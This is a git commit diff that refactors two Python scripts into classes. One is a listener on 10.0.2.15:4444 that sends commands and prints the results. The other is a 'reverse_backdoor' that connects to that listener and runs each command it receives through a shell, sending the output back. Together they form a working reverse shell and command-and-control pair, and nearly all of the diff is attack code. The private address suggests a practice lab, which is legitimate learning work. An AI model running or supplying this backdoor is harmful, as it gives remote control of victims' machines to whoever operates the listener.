6b9ecdabee39f22d24f9b605290817112b9dd981
Maffey <matiusz98@gmail.com>
2020-07-14 13:43:17 +0200

    converted listener and backdoor to classes

--- scripts/escalation/listener.py
+++ scripts/escalation/listener.py
@@ -4,16 +4,27 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("10.0.2.15", 4444))
-listener.listen(0)
-print("[+] Waiting for incoming connection...")
-connection, address = listener.accept()
-print(f"[+] Connection established! Source: {address}.")
 
-while True:
-    command = input(" >> ")
-    connection.send(command.encode(errors="replace"))
-    result = connection.recv(1024).decode(errors="replace")
-    print(result)
+class Listener:
+    def __init__(self, ip_address, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip_address, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection...")
+        self.connection, address = listener.accept()
+        print(f"[+] Connection established! Source: {address}.")
+
+    def run(self):
+        while True:
+            command = input(" >> ")
+            result = self.execute_remotely(command)
+            print(result)
+
+    def execute_remotely(self, command):
+        self.connection.send(command.encode(errors="replace"))
+        return self.connection.recv(1024).decode(errors="replace")
+
+
+listener = Listener("10.0.2.15", 4444)
+listener.run()
--- scripts/escalation/reverse_backdoor.py
+++ scripts/escalation/reverse_backdoor.py
@@ -6,16 +6,22 @@ import socket
 import subprocess
 
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip_addr, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip_addr, port))
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command_received = self.connection.recv(1024).decode(errors="replace")
+            command_result = self.execute_system_command(command_received)
+            self.connection.send(command_result)
+
+        self.connection.close()
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.15", 4444))
-
-while True:
-    command_received = connection.recv(1024).decode(errors="replace")
-    command_result = execute_system_command(command_received)
-    connection.send(command_result)
-
-connection.close()
+backdoor = Backdoor("10.0.2.15", 4444)
+backdoor.run()
